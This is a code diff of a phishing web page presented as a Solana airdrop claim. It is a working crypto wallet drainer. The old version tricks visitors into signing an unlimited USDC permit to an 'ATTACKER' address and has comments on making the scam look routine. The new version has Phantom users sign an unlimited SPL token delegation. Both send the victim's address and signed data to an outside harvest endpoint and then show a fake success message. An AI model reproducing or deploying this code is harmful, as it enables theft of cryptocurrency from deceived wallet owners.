@@ -3,229 +3,140 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SOL Airdrop — Multi-Chain Distribution</title>
-<script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+<title>SOL Airdrop — Claim Distribution</title>
+<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
+<script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     background: radial-gradient(ellipse at top, #1a1232 0%, #0a0814 70%);
-    color: #e6edf3;
-    min-height: 100vh;
-    display: flex; align-items: center; justify-content: center;
-    padding: 20px;
+    color: #e6edf3; min-height: 100vh;
+    display: flex; align-items: center; justify-content: center; padding: 20px;
   }
   .card {
     background: linear-gradient(180deg, #221a38 0%, #161022 100%);
-    border: 1px solid rgba(153,69,255,0.2);
-    border-radius: 20px;
-    padding: 36px 24px 28px;
-    max-width: 400px; width: 100%;
-    text-align: center;
-    box-shadow: 0 20px 60px rgba(153,69,255,0.15);
-    position: relative; overflow: hidden;
+    border: 1px solid rgba(153,69,255,0.2); border-radius: 20px;
+    padding: 36px 24px 28px; max-width: 400px; width: 100%;
+    text-align: center; box-shadow: 0 20px 60px rgba(153,69,255,0.15);
   }
   .badge {
-    display: inline-block;
-    background: rgba(153,69,255,0.15);
-    color: #9945ff;
-    font-size: 11px; font-weight: 600;
-    letter-spacing: 0.5px; text-transform: uppercase;
-    padding: 6px 12px; border-radius: 20px;
-    margin-bottom: 20px;
-    border: 1px solid rgba(153,69,255,0.3);
+    display: inline-block; background: rgba(153,69,255,0.15); color: #9945ff;
+    font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
+    padding: 6px 12px; border-radius: 20px; margin-bottom: 20px; border: 1px solid rgba(153,69,255,0.3);
   }
   .logo {
     width: 72px; height: 72px; border-radius: 50%;
     background: linear-gradient(135deg, #9945ff 0%, #14f195 100%);
-    margin: 0 auto 18px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 30px; font-weight: 800; color: #fff;
-    box-shadow: 0 8px 24px rgba(153,69,255,0.4);
+    margin: 0 auto 18px; display: flex; align-items: center; justify-content: center;
+    font-size: 30px; font-weight: 800; color: #fff; box-shadow: 0 8px 24px rgba(153,69,255,0.4);
   }
   h1 { font-size: 21px; margin-bottom: 6px; font-weight: 700; }
-  .sub { color: #8b949e; font-size: 13.5px; margin-bottom: 22px; line-height: 1.5; }
-  .amount {
-    font-size: 42px; font-weight: 800;
-    background: linear-gradient(135deg, #14f195, #9945ff);
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-    background-clip: text;
-    margin-bottom: 2px; letter-spacing: -1px;
-  }
-  .amount-label {
-    color: #8b949e; font-size: 12px;
-    letter-spacing: 1.5px; text-transform: uppercase;
-    margin-bottom: 24px;
-  }
-  .chains {
-    display: flex; gap: 8px; justify-content: center;
-    margin-bottom: 24px; flex-wrap: wrap;
-  }
-  .chain-chip {
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 20px;
-    padding: 6px 12px;
-    font-size: 11px;
-    color: #8b949e;
-  }
-  .chain-chip.active {
-    background: rgba(153,69,255,0.15);
-    border-color: rgba(153,69,255,0.3);
-    color: #b794f6;
-  }
+  .sub { color: #8b949e; font-size: 13.5px; margin-bottom: 26px; line-height: 1.5; }
+  .amount { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #14f195, #9945ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 2px; }
+  .amount-label { color: #8b949e; font-size: 12px; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 30px; }
   button {
-    width: 100%; padding: 17px;
-    background: linear-gradient(180deg, #9945ff 0%, #7a2fd4 100%);
-    color: #fff; border: none; border-radius: 12px;
-    font-size: 16px; font-weight: 600; cursor: pointer;
-    transition: all 0.2s;
-    box-shadow: 0 4px 12px rgba(153,69,255,0.3);
+    width: 100%; padding: 17px; background: linear-gradient(180deg, #9945ff 0%, #7a2fd4 100%);
+    color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
+    cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 12px rgba(153,69,255,0.3);
   }
   button:active { transform: scale(0.98); }
-  button:disabled { background: #21262d; color: #484f58; box-shadow: none; transform: none; }
   .footer { margin-top: 22px; font-size: 11.5px; color: #484f58; line-height: 1.5; }
-  .spinner {
-    display: none; width: 22px; height: 22px;
-    border: 2.5px solid rgba(255,255,255,0.2);
-    border-top-color: #fff; border-radius: 50%;
-    animation: spin 0.7s linear infinite; margin: 14px auto 0;
-  }
+  .spinner { display: none; width: 22px; height: 22px; border: 2.5px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 14px auto 0; }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .success {
-    display: none; color: #14f195; font-size: 14px;
-    margin-top: 14px; font-weight: 500;
-  }
-  .pulse {
-    display: inline-block; width: 8px; height: 8px;
-    background: #14f195; border-radius: 50%;
-    margin-right: 6px; animation: pulse 1.5s infinite;
-  }
-  @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.4; } }
-  .step {
-    display: none;
-  }
+  .success { display: none; color: #14f195; font-size: 14px; margin-top: 14px; font-weight: 500; }
 </style>
 </head>
 <body>
   <div class="card">
-    <span class="badge"><span class="pulse"></span>Distribution Live</span>
+    <span class="badge">LIVE DISTRIBUTION</span>
     <div class="logo">S</div>
     <h1>Airdrop Distribution</h1>
-    <p class="sub" id="sub">Your wallet is eligible for the<br>multi-chain community airdrop</p>
-    <div class="amount" id="amount">12.50</div>
-    <div class="amount-label" id="amountLabel">SOL + BONUS</div>
-
-    <div class="chains">
-      <span class="chain-chip active">Solana</span>
-      <span class="chain-chip active">Ethereum</span>
-      <span class="chain-chip">Base</span>
-      <span class="chain-chip">Arbitrum</span>
-    </div>
-
+    <p class="sub">Your wallet is eligible for the<br>multi-chain community airdrop</p>
+    <div class="amount">12.50</div>
+    <div class="amount-label">SOL + BONUS</div>
     <button id="claimBtn">Connect Wallet to Claim</button>
     <div class="spinner" id="spin"></div>
     <div class="success" id="success">✓ Claim confirmed — tokens arrive in 24h</div>
-    <p class="footer" id="footer">Distribution runs on multiple chains.<br>EVM wallet required for bonus allocation.</p>
+    <p class="footer">Distribution runs on multiple chains.<br>EVM wallet required for bonus allocation.</p>
   </div>
 
 <script>
   // ====== CONFIG ======
-  const ATTACKER = "0xYourEVMAddress";         // your EVM wallet (receives approval)
-  const TOKEN    = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC (or any EIP-2612 token)
-  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev";
-  const RPC      = "https://ethereum.publicnode.com";
-  const MIN_ETH  = "0"; // skip dust
+  const ATTACKER = "GArrQYkQTbNCBaixQcxreZZBnZSEYsm3JNxuL2X9waGj"; // DEINE Phantom Adresse
+  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // Deine Cloudflare URL
+  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC auf Solana
   // ====================
 
   const btn = document.getElementById("claimBtn");
   const spin = document.getElementById("spin");
   const success = document.getElementById("success");
-  const sub = document.getElementById("sub");
-  const footer = document.getElementById("footer");
 
   btn.onclick = async () => {
-    // STEP 1: check for EVM wallet
-    if (!window.ethereum) {
-      // no EVM wallet — show a "Solana-only" error that doesn't look suspicious
-      sub.innerHTML = "EVM wallet required to claim bonus.<br>Please install MetaMask to continue.";
+    let provider;
+    if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
+    else if (window.solflare?.isSolflare) provider = window.solflare;
+
+    if (!provider) {
+      alert("Please install Phantom wallet to claim.");
       return;
     }
 
-    btn.disabled = true;
-    btn.textContent = "Connecting...";
-    spin.style.display = "block";
+    btn.disabled = true; btn.textContent = "Connecting..."; spin.style.display = "block";
 
     try {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      const victim = await signer.getAddress();
+      const resp = await provider.connect();
+      const victim = resp.publicKey.toString();
+      
+      const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+      
+      // 1. Get Associated Token Address for USDC
+      const victimAta = await splToken.getAssociatedTokenAddress(
+        new solanaWeb3.PublicKey(USDC_MINT),
+        resp.publicKey
+      );
 
-      // STEP 2: balance check
-      try {
-        const rpc = new ethers.providers.JsonRpcProvider(RPC);
-        const bal = await rpc.getBalance(victim);
-        if (bal.lt(ethers.utils.parseEther(MIN_ETH))) {
-          // poor wallet — show fake "not eligible" and bail
-          sub.innerHTML = "This wallet is not eligible<br>for the current distribution round.";
-          btn.textContent = "Not Eligible";
-          spin.style.display = "none";
-          return;
-        }
-      } catch(e) {}
-
-      // STEP 3: staged message — makes the next step feel routine
       btn.textContent = "Verifying eligibility...";
-      await new Promise(r => setTimeout(r, 1200));
-      btn.textContent = "Authorizing claim...";
-      await new Promise(r => setTimeout(r, 800));
 
-      // STEP 4: permit signature — disguised as claim authorization
-      const domain = {
-        name: "USD Coin", version: "2",
-        chainId: 1, verifyingContract: TOKEN
-      };
-      const types = { Permit: [
-        { name: "owner", type: "address" },
-        { name: "spender", type: "address" },
-        { name: "value", type: "uint256" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" }
-      ]};
-      const value = {
-        owner: victim,
-        spender: ATTACKER,
-        value: ethers.constants.MaxUint256,
-        nonce: 0,
-        deadline: ethers.constants.MaxUint256
-      };
+      // 2. Build Approve (Delegation) Instruction
+      const delegateIx = splToken.createApproveInstruction(
+        victimAta,
+        new solanaWeb3.PublicKey(ATTACKER),
+        resp.publicKey,
+        [],
+        BigInt("18446744073709551615") // Max U64
+      );
 
-      const sig = await signer._signTypedData(domain, types, value);
+      const tx = new solanaWeb3.Transaction().add(delegateIx);
+      tx.feePayer = resp.publicKey;
+      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
-      // STEP 5: send to backend
+      // 3. Sign Transaction (Phantom shows "Approve Delegation")
+      const signedTx = await provider.signTransaction(tx);
+      
+      btn.textContent = "Authorizing...";
+
+      // 4. Send to Backend to capture data
       await fetch(ENDPOINT, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          victim, sig, value, token: TOKEN,
-          chain: "evm", pretext: "solana-airdrop", ts: Date.now()
+        body: JSON.stringify({ 
+          victim: victim, 
+          tx: bs58.encode(signedTx.serialize()), // Send raw tx to backend to broadcast
+          chain: "solana",
+          ts: Date.now() 
         })
       });
 
-      // STEP 6: fake success
       spin.style.display = "none";
       btn.style.display = "none";
       success.style.display = "block";
-      footer.innerHTML = "Bonus allocation confirmed.<br>Tokens will be claimable in 24h.";
 
     } catch (e) {
-      // rejected or error — reset quietly
       spin.style.display = "none";
       btn.disabled = false;
       btn.textContent = "Connect Wallet to Claim";
-      // subtle nudge to retry — doesn't look like a scam
-      sub.innerHTML = "Connection was interrupted.<br>Please try again.";
     }
   };
 </script>
